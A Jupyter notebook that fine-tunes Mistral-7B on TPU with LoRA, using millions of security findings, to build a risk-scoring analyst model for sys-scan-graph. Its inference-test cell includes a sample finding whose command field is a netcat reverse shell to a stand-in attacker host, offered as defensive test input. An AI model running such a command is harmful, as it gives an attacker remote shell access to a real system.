{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Sys-Scan Security Model - TPU Fine-Tuning on Massive Dataset\n",
    "\n",
    "**Runtime**: TPU v3-8 or v4-8  \n",
    "**Dataset**: 2.5M security findings with LangChain correlations  \n",
    "**Model**: Clean Mistral-7B-Instruct-v0.3 → Fine-tuned security analyst\n",
    "\n",
    "## Setup Instructions\n",
    "\n",
    "1. **Runtime**: Runtime → Change runtime type → TPU\n",
    "2. **Dataset**: Upload `massive_datasets.tar.gz` to Google Drive (`/content/drive/MyDrive/sys-scan/`)\n",
    "3. **Execute**: Run all cells\n",
    "4. **Output**: Model saved to Drive (`/content/drive/MyDrive/sys-scan/models/mistral-security-final/`)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1. Environment Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Check TPU availability\n",
    "import os\n",
    "import sys\n",
    "\n",
    "# Check for TPU\n",
    "try:\n",
    "    import torch_xla\n",
    "    import torch_xla.core.xla_model as xm\n",
    "    print(f\"✓ TPU detected: {xm.xla_device()}\")\n",
    "    print(f\"✓ TPU cores: {xm.xrt_world_size()}\")\n",
    "    USE_TPU = True\n",
    "except ImportError:\n",
    "    print(\"⚠️  No TPU detected - will use GPU/CPU\")\n",
    "    USE_TPU = False"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Install dependencies\n",
    "%%bash\n",
    "pip install -q transformers==4.36.0 datasets==2.15.0 accelerate==0.25.0\n",
    "pip install -q peft==0.7.0 trl==0.7.9 sentencepiece protobuf\n",
    "pip install -q bitsandbytes==0.41.3  # For GPU fallback\n",
    "\n",
    "# TPU-specific (if on TPU)\n",
    "if [ \"$COLAB_TPU_ADDR\" ]; then\n",
    "  pip install -q cloud-tpu-client==0.10 torch-xla==2.1.0\n",
    "fi\n",
    "\n",
    "echo \"✓ Dependencies installed\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Imports\n",
    "import torch\n",
    "import json\n",
    "import tarfile\n",
    "import logging\n",
    "from pathlib import Path\n",
    "from datetime import datetime\n",
    "from typing import Iterator, Dict, Any\n",
    "\n",
    "import transformers\n",
    "from transformers import (\n",
    "    AutoTokenizer,\n",
    "    AutoModelForCausalLM,\n",
    "    TrainingArguments,\n",
    "    DataCollatorForLanguageModeling\n",
    ")\n",
    "from datasets import Dataset, IterableDataset\n",
    "from peft import LoraConfig, get_peft_model, prepare_model_for_kbit_training\n",
    "from trl import SFTTrainer, DataCollatorForCompletionOnlyLM\n",
    "\n",
    "if USE_TPU:\n",
    "    import torch_xla.core.xla_model as xm\n",
    "    import torch_xla.distributed.parallel_loader as pl\n",
    "\n",
    "# Logging\n",
    "logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n",
    "logger = logging.getLogger(__name__)\n",
    "\n",
    "print(f\"PyTorch: {torch.__version__}\")\n",
    "print(f\"Transformers: {transformers.__version__}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2. Mount Google Drive"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from google.colab import drive\n",
    "drive.mount('/content/drive')\n",
    "\n",
    "# Setup paths\n",
    "DRIVE_ROOT = Path('/content/drive/MyDrive/sys-scan')\n",
    "DATASET_PATH = DRIVE_ROOT / 'massive_datasets.tar.gz'\n",
    "OUTPUT_DIR = DRIVE_ROOT / 'models' / 'mistral-security-final'\n",
    "CACHE_DIR = Path('/content/cache')\n",
    "WORK_DIR = Path('/content/workspace')\n",
    "\n",
    "# Create directories\n",
    "OUTPUT_DIR.mkdir(parents=True, exist_ok=True)\n",
    "CACHE_DIR.mkdir(parents=True, exist_ok=True)\n",
    "WORK_DIR.mkdir(parents=True, exist_ok=True)\n",
    "\n",
    "print(f\"✓ Drive mounted\")\n",
    "print(f\"  Dataset: {DATASET_PATH}\")\n",
    "print(f\"  Output: {OUTPUT_DIR}\")\n",
    "print(f\"  Dataset exists: {DATASET_PATH.exists()}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3. Extract and Prepare Massive Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Extract dataset\n",
    "print(\"Extracting massive dataset...\")\n",
    "EXTRACTED_DIR = WORK_DIR / 'massive_datasets'\n",
    "\n",
    "if not EXTRACTED_DIR.exists():\n",
    "    with tarfile.open(DATASET_PATH, 'r:gz') as tar:\n",
    "        tar.extractall(WORK_DIR)\n",
    "    print(f\"✓ Extracted to {EXTRACTED_DIR}\")\n",
    "else:\n",
    "    print(f\"✓ Already extracted: {EXTRACTED_DIR}\")\n",
    "\n",
    "# List dataset files\n",
    "dataset_files = sorted(list(EXTRACTED_DIR.glob('*.json')))\n",
    "print(f\"\\nFound {len(dataset_files)} dataset files\")\n",
    "for f in dataset_files[:5]:\n",
    "    size_mb = f.stat().st_size / 1024 / 1024\n",
    "    print(f\"  {f.name}: {size_mb:.1f} MB\")\n",
    "if len(dataset_files) > 5:\n",
    "    print(f\"  ... and {len(dataset_files) - 5} more\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 4. Streaming Data Loader for 2.5M Findings"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "class MassiveSecurityDataset:\n",
    "    \"\"\"Streaming dataset loader for massive security findings.\"\"\"\n",
    "    \n",
    "    SYSTEM_PROMPT = \"\"\"You are a security analysis AI embedded in sys-scan-graph. Analyze security findings and provide risk scoring, correlations, and remediation recommendations. Output valid JSON.\"\"\"\n",
    "    \n",
    "    def __init__(self, data_files: list, max_examples: int = None):\n",
    "        self.data_files = data_files\n",
    "        self.max_examples = max_examples\n",
    "        \n",
    "    def _create_training_example(self, finding: Dict[str, Any]) -> str:\n",
    "        \"\"\"Convert finding to instruction-following format.\"\"\"\n",
    "        # Input: minimal finding info\n",
    "        input_data = {\n",
    "            \"id\": finding.get(\"id\"),\n",
    "            \"title\": finding.get(\"title\"),\n",
    "            \"description\": finding.get(\"description\"),\n",
    "            \"metadata\": finding.get(\"metadata\", {}),\n",
    "            \"category\": finding.get(\"category\")\n",
    "        }\n",
    "        \n",
    "        # Output: enriched analysis\n",
    "        output_data = {\n",
    "            \"risk_score\": finding.get(\"risk_score\"),\n",
    "            \"severity\": finding.get(\"severity\"),\n",
    "            \"risk_subscores\": finding.get(\"risk_subscores\"),\n",
    "            \"probability_actionable\": finding.get(\"probability_actionable\"),\n",
    "            \"baseline_status\": finding.get(\"baseline_status\"),\n",
    "            \"tags\": finding.get(\"tags\", []),\n",
    "            \"rationale\": finding.get(\"rationale\")\n",
    "        }\n",
    "        \n",
    "        instruction = \"Analyze this security finding and provide risk scoring with subscores (impact, exposure, anomaly, confidence), severity classification, and actionability assessment.\"\n",
    "        \n",
    "        # Mistral-Instruct format\n",
    "        text = f\"\"\"<s>[INST] {self.SYSTEM_PROMPT} [/INST]\n",
    "[INST] {instruction}\n",
    "\n",
    "Input:\n",
    "{json.dumps(input_data, indent=2)}\n",
    "[/INST]\n",
    "{json.dumps(output_data, indent=2)}</s>\"\"\"\n",
    "        \n",
    "        return text\n",
    "    \n",
    "    def stream_examples(self) -> Iterator[Dict[str, str]]:\n",
    "        \"\"\"Stream training examples from all files.\"\"\"\n",
    "        count = 0\n",
    "        \n",
    "        for file_path in self.data_files:\n",
    "            logger.info(f\"Loading {file_path.name}...\")\n",
    "            \n",
    "            with open(file_path) as f:\n",
    "                data = json.load(f)\n",
    "            \n",
    "            # Handle nested structure\n",
    "            if 'data' in data:\n",
    "                findings_data = data['data']\n",
    "            else:\n",
    "                findings_data = data\n",
    "            \n",
    "            # Extract all findings\n",
    "            findings_by_category = findings_data.get('findings', {})\n",
    "            \n",
    "            for category, severity_groups in findings_by_category.items():\n",
    "                if not isinstance(severity_groups, dict):\n",
    "                    continue\n",
    "                    \n",
    "                for severity, findings_list in severity_groups.items():\n",
    "                    if not isinstance(findings_list, list):\n",
    "                        continue\n",
    "                    \n",
    "                    for finding in findings_list:\n",
    "                        if self.max_examples and count >= self.max_examples:\n",
    "                            return\n",
    "                        \n",
    "                        try:\n",
    "                            text = self._create_training_example(finding)\n",
    "                            yield {\"text\": text}\n",
    "                            count += 1\n",
    "                            \n",
    "                            if count % 10000 == 0:\n",
    "                                logger.info(f\"Streamed {count:,} examples...\")\n",
    "                        except Exception as e:\n",
    "                            logger.warning(f\"Skipping finding {finding.get('id')}: {e}\")\n",
    "                            continue\n",
    "        \n",
    "        logger.info(f\"✓ Streamed {count:,} total examples\")\n",
    "\n",
    "# Test streaming\n",
    "dataset_loader = MassiveSecurityDataset(dataset_files, max_examples=10)\n",
    "sample = next(dataset_loader.stream_examples())\n",
    "print(\"\\nSample training example:\")\n",
    "print(sample['text'][:500] + \"...\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 5. Configuration"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Training configuration optimized for TPU\n",
    "CONFIG = {\n",
    "    # Model\n",
    "    \"model_name\": \"mistralai/Mistral-7B-Instruct-v0.3\",\n",
    "    \n",
    "    # Data\n",
    "    \"max_examples\": None,  # Use all 2.5M (set to smaller number for testing)\n",
    "    \"train_split\": 0.95,   # 95% train, 5% eval\n",
    "    \"max_seq_length\": 2048,\n",
    "    \n",
    "    # LoRA\n",
    "    \"lora_r\": 128,          # Higher rank for massive dataset\n",
    "    \"lora_alpha\": 256,\n",
    "    \"lora_dropout\": 0.05,\n",
    "    \"lora_targets\": [\"q_proj\", \"k_proj\", \"v_proj\", \"o_proj\", \n",
    "                     \"gate_proj\", \"up_proj\", \"down_proj\"],\n",
    "    \n",
    "    # Training - TPU optimized\n",
    "    \"num_epochs\": 3,\n",
    "    \"per_device_batch_size\": 16 if USE_TPU else 4,  # TPU can handle larger batches\n",
    "    \"gradient_accumulation\": 2 if USE_TPU else 4,\n",
    "    \"learning_rate\": 2e-4,\n",
    "    \"weight_decay\": 0.01,\n",
    "    \"warmup_ratio\": 0.03,\n",
    "    \"max_grad_norm\": 1.0,\n",
    "    \n",
    "    # Precision\n",
    "    \"bf16\": True,  # BF16 for TPU, FP16 for GPU\n",
    "    \"fp16\": False,\n",
    "    \n",
    "    # Logging & Saving\n",
    "    \"logging_steps\": 100,\n",
    "    \"eval_steps\": 5000,\n",
    "    \"save_steps\": 5000,\n",
    "    \"save_total_limit\": 3,\n",
    "    \n",
    "    # Optimization\n",
    "    \"gradient_checkpointing\": True,\n",
    "    \"optim\": \"adafactor\" if USE_TPU else \"paged_adamw_8bit\",\n",
    "}\n",
    "\n",
    "# Effective batch size\n",
    "effective_batch = CONFIG[\"per_device_batch_size\"] * CONFIG[\"gradient_accumulation\"]\n",
    "if USE_TPU:\n",
    "    effective_batch *= 8  # 8 TPU cores\n",
    "\n",
    "print(\"Training Configuration:\")\n",
    "print(json.dumps(CONFIG, indent=2))\n",
    "print(f\"\\nEffective batch size: {effective_batch}\")\n",
    "print(f\"Total training steps: ~{(2_500_000 * CONFIG['num_epochs']) // effective_batch:,}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 6. Load Model and Tokenizer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Load tokenizer\n",
    "print(\"Loading tokenizer...\")\n",
    "tokenizer = AutoTokenizer.from_pretrained(\n",
    "    CONFIG[\"model_name\"],\n",
    "    cache_dir=str(CACHE_DIR),\n",
    "    trust_remote_code=True\n",
    ")\n",
    "\n",
    "# Set padding token\n",
    "if tokenizer.pad_token is None:\n",
    "    tokenizer.pad_token = tokenizer.eos_token\n",
    "    tokenizer.pad_token_id = tokenizer.eos_token_id\n",
    "\n",
    "print(f\"✓ Tokenizer loaded (vocab: {len(tokenizer):,})\")\n",
    "\n",
    "# Load model\n",
    "print(\"\\nLoading model (this may take a few minutes)...\")\n",
    "\n",
    "if USE_TPU:\n",
    "    # TPU: Load in BF16\n",
    "    model = AutoModelForCausalLM.from_pretrained(\n",
    "        CONFIG[\"model_name\"],\n",
    "        cache_dir=str(CACHE_DIR),\n",
    "        torch_dtype=torch.bfloat16,\n",
    "        trust_remote_code=True\n",
    "    )\n",
    "else:\n",
    "    # GPU: Load with 4-bit quantization\n",
    "    from transformers import BitsAndBytesConfig\n",
    "    \n",
    "    bnb_config = BitsAndBytesConfig(\n",
    "        load_in_4bit=True,\n",
    "        bnb_4bit_quant_type=\"nf4\",\n",
    "        bnb_4bit_compute_dtype=torch.bfloat16,\n",
    "        bnb_4bit_use_double_quant=True,\n",
    "    )\n",
    "    \n",
    "    model = AutoModelForCausalLM.from_pretrained(\n",
    "        CONFIG[\"model_name\"],\n",
    "        quantization_config=bnb_config,\n",
    "        device_map=\"auto\",\n",
    "        cache_dir=str(CACHE_DIR),\n",
    "        trust_remote_code=True\n",
    "    )\n",
    "    model = prepare_model_for_kbit_training(model, use_gradient_checkpointing=True)\n",
    "\n",
    "print(f\"✓ Model loaded\")\n",
    "\n",
    "# Apply LoRA\n",
    "print(\"\\nApplying LoRA adapters...\")\n",
    "peft_config = LoraConfig(\n",
    "    r=CONFIG[\"lora_r\"],\n",
    "    lora_alpha=CONFIG[\"lora_alpha\"],\n",
    "    lora_dropout=CONFIG[\"lora_dropout\"],\n",
    "    target_modules=CONFIG[\"lora_targets\"],\n",
    "    bias=\"none\",\n",
    "    task_type=\"CAUSAL_LM\",\n",
    ")\n",
    "\n",
    "model = get_peft_model(model, peft_config)\n",
    "model.print_trainable_parameters()\n",
    "\n",
    "print(\"✓ LoRA applied\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 7. Prepare Datasets"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Create streaming dataset\n",
    "print(\"Creating streaming dataset...\")\n",
    "\n",
    "dataset_loader = MassiveSecurityDataset(\n",
    "    dataset_files,\n",
    "    max_examples=CONFIG[\"max_examples\"]\n",
    ")\n",
    "\n",
    "# Create iterable dataset for efficient streaming\n",
    "def gen():\n",
    "    for example in dataset_loader.stream_examples():\n",
    "        yield example\n",
    "\n",
    "# Use IterableDataset for memory-efficient streaming\n",
    "from datasets import Dataset\n",
    "import random\n",
    "\n",
    "# For massive datasets, we'll use IterableDataset\n",
    "# But for proper train/eval split, let's load into memory once\n",
    "# (2.5M examples * ~1KB each = ~2.5GB, manageable)\n",
    "\n",
    "print(\"Loading all examples into memory for splitting...\")\n",
    "all_examples = list(dataset_loader.stream_examples())\n",
    "print(f\"✓ Loaded {len(all_examples):,} examples\")\n",
    "\n",
    "# Shuffle and split\n",
    "random.seed(42)\n",
    "random.shuffle(all_examples)\n",
    "\n",
    "split_idx = int(len(all_examples) * CONFIG[\"train_split\"])\n",
    "train_examples = all_examples[:split_idx]\n",
    "eval_examples = all_examples[split_idx:]\n",
    "\n",
    "# Create datasets\n",
    "train_dataset = Dataset.from_list(train_examples)\n",
    "eval_dataset = Dataset.from_list(eval_examples)\n",
    "\n",
    "print(f\"\\n✓ Dataset split:\")\n",
    "print(f\"  Train: {len(train_dataset):,} examples\")\n",
    "print(f\"  Eval: {len(eval_dataset):,} examples\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 8. Training Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Training arguments\n",
    "training_args = TrainingArguments(\n",
    "    output_dir=str(OUTPUT_DIR),\n",
    "    num_train_epochs=CONFIG[\"num_epochs\"],\n",
    "    per_device_train_batch_size=CONFIG[\"per_device_batch_size\"],\n",
    "    per_device_eval_batch_size=CONFIG[\"per_device_batch_size\"],\n",
    "    gradient_accumulation_steps=CONFIG[\"gradient_accumulation\"],\n",
    "    learning_rate=CONFIG[\"learning_rate\"],\n",
    "    weight_decay=CONFIG[\"weight_decay\"],\n",
    "    warmup_ratio=CONFIG[\"warmup_ratio\"],\n",
    "    max_grad_norm=CONFIG[\"max_grad_norm\"],\n",
    "    bf16=CONFIG[\"bf16\"],\n",
    "    fp16=CONFIG[\"fp16\"],\n",
    "    logging_steps=CONFIG[\"logging_steps\"],\n",
    "    evaluation_strategy=\"steps\",\n",
    "    eval_steps=CONFIG[\"eval_steps\"],\n",
    "    save_strategy=\"steps\",\n",
    "    save_steps=CONFIG[\"save_steps\"],\n",
    "    save_total_limit=CONFIG[\"save_total_limit\"],\n",
    "    load_best_model_at_end=True,\n",
    "    metric_for_best_model=\"eval_loss\",\n",
    "    greater_is_better=False,\n",
    "    optim=CONFIG[\"optim\"],\n",
    "    gradient_checkpointing=CONFIG[\"gradient_checkpointing\"],\n",
    "    report_to=[\"tensorboard\"],\n",
    "    logging_dir=str(OUTPUT_DIR / \"logs\"),\n",
    "    seed=42,\n",
    ")\n",
    "\n",
    "# Data collator - only compute loss on assistant responses\n",
    "response_template = \"[/INST]\"\n",
    "collator = DataCollatorForCompletionOnlyLM(\n",
    "    response_template=response_template,\n",
    "    tokenizer=tokenizer,\n",
    "    mlm=False\n",
    ")\n",
    "\n",
    "# Create trainer\n",
    "trainer = SFTTrainer(\n",
    "    model=model,\n",
    "    args=training_args,\n",
    "    train_dataset=train_dataset,\n",
    "    eval_dataset=eval_dataset,\n",
    "    tokenizer=tokenizer,\n",
    "    dataset_text_field=\"text\",\n",
    "    max_seq_length=CONFIG[\"max_seq_length\"],\n",
    "    data_collator=collator,\n",
    "    packing=False,\n",
    ")\n",
    "\n",
    "print(\"✓ Trainer initialized\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 9. Train Model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Start training\n",
    "print(\"=\"*80)\n",
    "print(\"STARTING TRAINING\")\n",
    "print(\"=\"*80)\n",
    "print(f\"Training on {len(train_dataset):,} examples\")\n",
    "print(f\"Evaluating on {len(eval_dataset):,} examples\")\n",
    "print(f\"Total epochs: {CONFIG['num_epochs']}\")\n",
    "print(f\"Effective batch size: {effective_batch}\")\n",
    "print(\"=\"*80)\n",
    "\n",
    "start_time = datetime.now()\n",
    "print(f\"Start time: {start_time}\\n\")\n",
    "\n",
    "# Train\n",
    "trainer.train()\n",
    "\n",
    "end_time = datetime.now()\n",
    "duration = end_time - start_time\n",
    "\n",
    "print(\"\\n\" + \"=\"*80)\n",
    "print(\"TRAINING COMPLETED\")\n",
    "print(\"=\"*80)\n",
    "print(f\"End time: {end_time}\")\n",
    "print(f\"Duration: {duration}\")\n",
    "print(\"=\"*80)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 10. Final Evaluation"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Final evaluation\n",
    "print(\"Running final evaluation...\")\n",
    "eval_results = trainer.evaluate()\n",
    "\n",
    "print(\"\\nEvaluation Results:\")\n",
    "for key, value in eval_results.items():\n",
    "    print(f\"  {key}: {value:.4f}\")\n",
    "\n",
    "# Save results\n",
    "with open(OUTPUT_DIR / \"eval_results.json\", \"w\") as f:\n",
    "    json.dump(eval_results, f, indent=2)\n",
    "\n",
    "print(f\"\\n✓ Results saved to {OUTPUT_DIR / 'eval_results.json'}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 11. Save Final Model to Google Drive"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Save model and tokenizer\n",
    "print(f\"Saving final model to Google Drive...\")\n",
    "print(f\"Location: {OUTPUT_DIR}\")\n",
    "\n",
    "trainer.save_model(str(OUTPUT_DIR))\n",
    "tokenizer.save_pretrained(str(OUTPUT_DIR))\n",
    "\n",
    "# Save training config\n",
    "with open(OUTPUT_DIR / \"training_config.json\", \"w\") as f:\n",
    "    json.dump(CONFIG, f, indent=2)\n",
    "\n",
    "# Save training summary\n",
    "summary = {\n",
    "    \"start_time\": start_time.isoformat(),\n",
    "    \"end_time\": end_time.isoformat(),\n",
    "    \"duration_seconds\": duration.total_seconds(),\n",
    "    \"train_examples\": len(train_dataset),\n",
    "    \"eval_examples\": len(eval_dataset),\n",
    "    \"final_eval_loss\": eval_results.get(\"eval_loss\"),\n",
    "    \"use_tpu\": USE_TPU,\n",
    "}\n",
    "\n",
    "with open(OUTPUT_DIR / \"training_summary.json\", \"w\") as f:\n",
    "    json.dump(summary, f, indent=2)\n",
    "\n",
    "print(\"\\n✓ Model saved successfully!\")\n",
    "print(\"\\nSaved files:\")\n",
    "for f in sorted(OUTPUT_DIR.glob(\"*\")):\n",
    "    if f.is_file():\n",
    "        size_mb = f.stat().st_size / 1024 / 1024\n",
    "        print(f\"  {f.name}: {size_mb:.1f} MB\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 12. Test Inference"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Test the trained model\n",
    "test_finding = {\n",
    "    \"id\": \"test_001\",\n",
    "    \"title\": \"Suspicious process execution\",\n",
    "    \"description\": \"Process /usr/bin/python3 executing with unusual command line arguments\",\n",
    "    \"metadata\": {\n",
    "        \"pid\": 12345,\n",
    "        \"command\": \"/usr/bin/python3 -c 'import os; os.system(\\\"nc -e /bin/bash attacker.com 4444\\\")'\",\n",
    "        \"user\": \"www-data\",\n",
    "        \"ppid\": 1000\n",
    "    },\n",
    "    \"category\": \"processes\"\n",
    "}\n",
    "\n",
    "prompt = f\"\"\"<s>[INST] You are a security analysis AI. Analyze security findings and provide risk scoring. [/INST]\n",
    "[INST] Analyze this security finding and provide risk scoring with subscores (impact, exposure, anomaly, confidence), severity classification, and actionability assessment.\n",
    "\n",
    "Input:\n",
    "{json.dumps(test_finding, indent=2)}\n",
    "[/INST]\n",
    "\"\"\"\n",
    "\n",
    "# Move model to appropriate device for inference\n",
    "if USE_TPU:\n",
    "    device = xm.xla_device()\n",
    "else:\n",
    "    device = model.device\n",
    "\n",
    "inputs = tokenizer(prompt, return_tensors=\"pt\").to(device)\n",
    "\n",
    "print(\"Generating response...\")\n",
    "with torch.no_grad():\n",
    "    outputs = model.generate(\n",
    "        **inputs,\n",
    "        max_new_tokens=512,\n",
    "        temperature=0.7,\n",
    "        do_sample=True,\n",
    "        pad_token_id=tokenizer.eos_token_id\n",
    "    )\n",
    "\n",
    "response = tokenizer.decode(outputs[0], skip_special_tokens=True)\n",
    "\n",
    "print(\"\\n\" + \"=\"*80)\n",
    "print(\"MODEL RESPONSE:\")\n",
    "print(\"=\"*80)\n",
    "print(response)\n",
    "print(\"=\"*80)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Summary\n",
    "\n",
    "✓ Model trained on 2.5M security findings  \n",
    "✓ Saved to Google Drive: `/content/drive/MyDrive/sys-scan/models/mistral-security-final/`  \n",
    "✓ Ready for deployment in sys-scan-graph\n",
    "\n",
    "### Next Steps\n",
    "\n",
    "1. Download model from Google Drive\n",
    "2. Integrate with sys-scan-graph agent\n",
    "3. Test on real security scans\n",
    "4. Monitor performance and iterate"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.0"
  },
  "accelerator": "TPU"
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
